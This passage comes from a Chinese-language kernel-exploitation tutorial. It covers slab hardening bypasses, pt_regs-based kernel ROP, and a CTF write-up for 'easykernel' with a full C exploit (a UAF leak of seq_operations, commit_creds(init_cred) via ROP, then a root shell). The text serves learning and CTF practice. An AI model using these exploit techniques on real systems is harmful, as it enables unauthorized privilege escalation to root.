<span class="hljs-number">0x200</span>; i++)<br>        read(seq_fd[i], data, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行即可提权到 root</p><p><a href="https://i.loli.net/2021/11/02/oE6vb9nhT1rDwO7.png"><img src="https://s2.loli.net/2023/02/06/OHLtcG2QfYvMX7p.png" alt="image.png"></a></p><h2 id="Off-by-One"><a href="#Off-by-One" class="headerlink" title="Off by One"></a>Off by One</h2><p>off-by-one 算是堆溢出里面比较特殊的类型，这里笔者其实是将这一类仅溢出少数字节的堆溢出统称 off-by-one，溢出的不一定只是单个字节，不过比较常见的就是溢出一两个字节，若溢出单个 <code>\x00</code> 字节则称为 off-by-null（比如说在拷贝字符串时容易出现这个问题）</p><h3 id="例题：0CTF2017-knote"><a href="#例题：0CTF2017-knote" class="headerlink" title="例题：0CTF2017 - knote"></a>例题：0CTF2017 - knote</h3><blockquote><p>感兴趣的可以去看 CVE-2021-22555，其实也是一个堆上的 off-by-null的 情况，但是 Google 给出的利用手法很  🐂🍺</p></blockquote><h2 id="Slab-Freelist-Hardened-bypass"><a href="#Slab-Freelist-Hardened-bypass" class="headerlink" title="Slab Freelist Hardened bypass"></a>Slab Freelist Hardened bypass</h2><p>类似于用户态下 glibc 中的 safe-linking 机制，在内核中的 slab/slub 分配器当中也存在着类似的机制保护着 freelist—— <code>SLAB_FREELIST_HARDENED</code>：</p><p>对于 freelist 中存储的 object，其 fd 所存储的值为<strong>current object addr 与 next object addr 与 slub cookie</strong>这三个值<strong>异或</strong>所得的值，这要求我们在构造任意地址写时需要同时知道这三个值才能通过内核中的检测</p><p>不过 kmalloc 并不会清空 object 上数据，我们仍可以通过<strong>重分配</strong>的方式从 object 上残留的 dirty data 中获取到 slub cookie，再通过其他方式泄露内核堆地址后便能重新进行任意地址写</p><p>在编译内核时在 <code>.config</code> 中添加编译选项 <code>CONFIG_SLAB_FREELIST_HARDENED=y</code> 即可开启这种加固机制（目前新版内核似乎默认开启）</p><h3 id="例题：强网杯2021线上赛-notebook-1"><a href="#例题：强网杯2021线上赛-notebook-1" class="headerlink" title="例题：强网杯2021线上赛 - notebook"></a>例题：强网杯2021线上赛 - notebook</h3><blockquote><p>这题要用到 userfaultfd，放后面讲</p></blockquote><h2 id="CONFIG-INIT-ON-ALLOC-DEFAULT-ON"><a href="#CONFIG-INIT-ON-ALLOC-DEFAULT-ON" class="headerlink" title="CONFIG_INIT_ON_ALLOC_DEFAULT_ON"></a>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</h2><p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），<strong>会将被分配的内存上的内容进行清零</strong>，从而防止了利用未初始化内存进行数据泄露的情况</p><p>据悉性能损耗在 <code>1%~7%</code> 之间</p><h1 id="两套组合拳"><a href="#两套组合拳" class="headerlink" title="两套组合拳"></a>两套组合拳</h1><p>在学习了以上内核基本利用技巧之后，我们可以很容易地发现 kernel pwn 中的一些通用 tricks 与通用解法</p><h2 id="pt-regs-构造通用-kernel-ROP解法-（may-obsolete）"><a href="#pt-regs-构造通用-kernel-ROP解法-（may-obsolete）" class="headerlink" title="_pt_regs 构造通用 kernel ROP解法_（may obsolete）"></a>_pt_regs 构造通用 kernel ROP解法_（may obsolete）</h2><h3 id="pre-前置条件"><a href="#pre-前置条件" class="headerlink" title="pre.前置条件"></a>pre.前置条件</h3><p>可以控制内核执行流（劫持至少一个指针），（可选）已经泄露内核基址</p><h3 id="系统调用-与-pt-regs-结构体"><a href="#系统调用-与-pt-regs-结构体" class="headerlink" title="系统调用 与 pt_regs 结构体"></a>系统调用 与 pt_regs 结构体</h3><p>系统调用的本质是什么？或许不少人都能够答得上来是由我们在用户态布置好相应的参数后执行 <code>syscall</code> 这一汇编指令，通过门结构进入到内核中的 <code>entry_SYSCALL_64</code>这一函数，随后通过系统调用表跳转到对应的函数</p><p>现在让我们将目光放到 <code>entry_SYSCALL_64</code> 这一用汇编写的函数内部，观察，我们不难发现其有着<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">这样一条指令</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ASSEMBLY">PUSH_AND_CLEAR_REGS rax=$-ENOSYS<br></code></pre></div></td></tr></table></figure><p>这是一条十分有趣的指令，它会将所有的寄存器<strong>压入内核栈上，形成一个 pt_regs 结构体</strong>，该结构体实质上位于内核栈底，<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">定义</a>如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r15;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r14;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r13;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r12;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rbp;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r11;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r10;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r9;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> r8;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rax;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rcx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rdx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rsi;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rip;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cs;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> eflags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> rsp;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>在内核栈上的结构如下：</p><p><a href="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png"><img src="https://s2.loli.net/2023/02/06/L2vxtMQNVrw6Zm8.png" alt="image.png"></a></p><h3 id="内核栈-与通用-ROP"><a href="#内核栈-与通用-ROP" class="headerlink" title="内核栈 与通用 ROP"></a>内核栈 与通用 ROP</h3><p>我们都知道，内核栈<strong>只有一个页面的大小</strong>，而 pt_regs 结构体则固定位于<strong>内核栈栈底</strong>，当我们劫持内核结构体中的某个函数指针时（例如 seq_operations-&gt;start），在我们通过该函数指针劫持内核执行流时 <strong>rsp 与 栈底的相对偏移通常是不变的</strong></p><p>而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，<strong>这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：</strong></p><ul><li><strong>只需要寻找到一条形如 “add rsp, val ; ret” 的 gadget 便能够完成 ROP</strong></li></ul><p>这是一个通用的 ROP 板子，方便调试时观察：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">__asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0x88888888;&quot;</span><br>    <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="hljs-comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>);<br></code></pre></div></td></tr></table></figure><h3 id="新版本内核对抗利用-pt-regs-进行攻击的办法"><a href="#新版本内核对抗利用-pt-regs-进行攻击的办法" class="headerlink" title="新版本内核对抗利用 pt_regs 进行攻击的办法"></a>新版本内核对抗利用 pt_regs 进行攻击的办法</h3><p>正所谓魔高一尺道高一丈，内核主线在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14">这个 commit</a> 中为系统调用栈<strong>添加了一个偏移值，这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值</strong> </p><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs DIFF"><span class="hljs-comment">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="hljs-comment">index 4efd39aacb9f2..7b2542b13ebd9 100644</span><br><span class="hljs-comment">--- a/arch/x86/entry/common.c</span><br><span class="hljs-comment">+++ b/arch/x86/entry/common.c</span><br><span class="hljs-meta">@@ -38,6 +38,7 @@</span><br> #ifdef CONFIG_X86_64<br> __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)<br> &#123;<br><span class="hljs-addition">+    add_random_kstack_offset();</span><br>     nr = syscall_enter_from_user_mode(regs, nr);<br><br>     instrumentation_begin();<br></code></pre></div></td></tr></table></figure><p>当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 slide gadget 来继续完成利用，不过稳定性也大幅下降了， <em>可以说这种利用方式基本上是废了</em> </p><h3 id="例题：西湖论剑2021线上初赛-easykernel"><a href="#例题：西湖论剑2021线上初赛-easykernel" class="headerlink" title="例题：西湖论剑2021线上初赛 - easykernel"></a><em>例题：西湖论剑2021线上初赛 - easykernel</em></h3><p>今年的西湖论剑的宣传比以往的阵势要大得多，笔者在学校饭堂吃完饭出来都能碰到发传单的，这一次笔者与笔者的队友也参加了本次的西湖论剑CTF，其中有一道 easykernl 算是一道质量还可以的的 kernel pwn 入门题，可惜在比赛时笔者手慢一步只拿到了三血</p><p>闲话不多说，以下是题解</p><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>首先查看启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br><br>qemu-system-x86_64  \<br>-m 64M \<br>-cpu kvm64,+smep \<br>-kernel ./bzImage \<br>-initrd rootfs.img \<br>-nographic \<br>-s \<br>-append <span class="hljs-string">&quot;console=ttyS0 kaslr quiet noapic&quot;</span><br></code></pre></div></td></tr></table></figure><p>开了 SMEP 和 KASLR</p><p>运行启动脚本，查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code>：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>KVM: Mitigation: VMX unsupported<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br>Not affected<br></code></pre></div></td></tr></table></figure><p>开启了 PTI （页表隔离）</p><p>题目给了个 test.ko，按惯例这就是有漏洞的 LKM</p><p>拖入 IDA 进行分析，发现只定义了 ioctl，可以看出是常见的“菜单堆”，给出了分配、释放、读、写 object 的功能</p><p><a href="https://i.loli.net/2021/11/20/y7KwuZB3tTehGHP.png"><img src="https://s2.loli.net/2023/02/06/BnbpHJuislK258F.png" alt="image.png"></a></p><p>对于分配 object，我们需要传入如下形式结构体：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">void</span> *buf;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>对于释放、读、写 object，则需要传入如下形式结构体</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">void</span> *buf;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h5 id="分配：0x20"><a href="#分配：0x20" class="headerlink" title="分配：0x20"></a>分配：0x20</h5><p>比较常规的 kmalloc，没有限制size，最多可以分配 0x20 个 chunk</p><p><a href="https://i.loli.net/2021/11/20/hzcYQx6OD7uVP5T.png"><img src="https://s2.loli.net/2023/02/06/trFU3IQ4BShEa8P.png" alt="image.png"></a></p><h5 id="释放：0x30"><a href="#释放：0x30" class="headerlink" title="释放：0x30"></a>释放：0x30</h5><p><strong>kfree 以后没有清空指针，直接就有一个裸的 UAF 糊脸</strong></p><p><a href="https://i.loli.net/2021/11/20/jGy6mShgPAIJeQN.png"><img src="https://s2.loli.net/2023/02/06/IkDQYizFE9pcPfZ.png" alt="image.png"></a></p><h5 id="读：0x40"><a href="#读：0x40" class="headerlink" title="读：0x40"></a>读：0x40</h5><p>会调用 show 函数</p><p><a href="https://i.loli.net/2021/11/20/MKeuzEXod94lI12.png"><img src="https://s2.loli.net/2023/02/06/5C3VUTL8xYsHuea.png" alt="image.png"></a></p><p>其实就是套了一层皮的读 object 内容，加了一点点越界检查</p><p><a href="https://i.loli.net/2021/11/20/5RsVwHToCYXdAIa.png"><img src="https://s2.loli.net/2023/02/06/4MEtVryJAuGPXpi.png" alt="image.png"></a></p><h5 id="写：0x50"><a href="#写：0x50" class="headerlink" title="写：0x50"></a>写：0x50</h5><p>常规的写入 object，加了一点点检查</p><p><a href="https://i.loli.net/2021/11/20/VFX2SgEn6YR9v3M.png"><img src="https://s2.loli.net/2023/02/06/aoWNJuMTYfmDUeK.png" alt="image.png"></a></p><h4 id="解法：UAF-seq-operations-pt-regs-ROP"><a href="#解法：UAF-seq-operations-pt-regs-ROP" class="headerlink" title="解法：UAF + seq_operations + pt_regs + ROP"></a>解法：UAF + seq_operations + pt_regs + ROP</h4><p>题目没有说明，那笔者默认应该是没开 Hardened Freelist，现在又有 UAF，那么解法就是多种多样的了，笔者这里选择用 <code>seq_operations 结构体</code> + <code>pt_regs 结构体</code>构造 ROP 进行提权</p><p>exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COMMIT_CREDS 0xffffffff810c8d40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEQ_OPS_0 0xffffffff81319d30</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INIT_CRED 0xffffffff82663300</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81089250</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><br><span class="hljs-keyword">long</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span>  idx;<br>    <span class="hljs-keyword">size_t</span>  size;<br>    <span class="hljs-keyword">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span>  size;<br>    <span class="hljs-keyword">void</span>    *buf;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">void</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x40</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">writeChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">void</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x50</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deleteChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">op_chunk</span> <span class="hljs-title">op</span> =</span> <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x30</span>, &amp;op);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">allocChunk</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">void</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_chunk</span> <span class="hljs-title">alloc</span> =</span> <br>    &#123;<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0x20</span>, &amp;alloc);<br>&#125;<br><br><span class="hljs-keyword">size_t</span>      buf[<span class="hljs-number">0x100</span>];<br><span class="hljs-keyword">size_t</span>      swapgs_restore_regs_and_return_to_usermode;<br><span class="hljs-keyword">size_t</span>      init_cred;<br><span class="hljs-keyword">size_t</span>      pop_rdi_ret;<br><span class="hljs-keyword">long</span>        seq_fd;<br><span class="hljs-keyword">void</span> *      kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-keyword">size_t</span>      kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">size_t</span>      commit_creds;<br><span class="hljs-keyword">size_t</span>      gadget;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);<br><br>    allocChunk(<span class="hljs-number">0x20</span>, buf);<br>    deleteChunk(<span class="hljs-number">0</span>);<br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    readChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    kernel_offset = buf[<span class="hljs-number">0</span>] - SEQ_OPS_0;<br>    kernel_base += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset;<br>    init_cred = INIT_CRED + kernel_offset;<br>    pop_rdi_ret = POP_RDI_RET + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    gadget = <span class="hljs-number">0xffffffff8135b0f6</span> + kernel_offset; <span class="hljs-comment">// add rsp 一个数然后 pop 一堆寄存器最后ret，具体的不记得了，懒得再回去翻了</span><br><br>    buf[<span class="hljs-number">0</span>] = gadget;<br>    swapgs_restore_regs_and_return_to_usermode += <span class="hljs-number">9</span>;<br>    writeChunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, buf);<br><br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15, 0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, pop_rdi_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, init_cred;&quot;</span> <span class="hljs-comment">// add rsp, 0x40 ; ret</span><br>        <span class="hljs-string">&quot;mov r12, commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx, 0x999999999;&quot;</span><br>        <span class="hljs-string">&quot;mov r11, 0x114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r10, 0x666666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r9, 0x1919114514;&quot;</span><br>        <span class="hljs-string">&quot;mov r8, 0xabcd1919810;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx, 0x666666;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 8;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, rsp;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, seq_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>远程设置了120s关机，glibc 编译出来的可执行文件会比较大没法传完，<strong>这里笔者选择使用 musl</strong> </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">musl-gcc exp.c -o exp -static -masm=intel<br></code></pre></div></td></tr></table></figure><blockquote><p>其实写纯汇编是最小的，但是着急抢一血所以还是写常规的C，早上又有一个实验要做把时间占掉了结果最后只拿了三血…</p></blockquote><p>打远程用的脚本：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 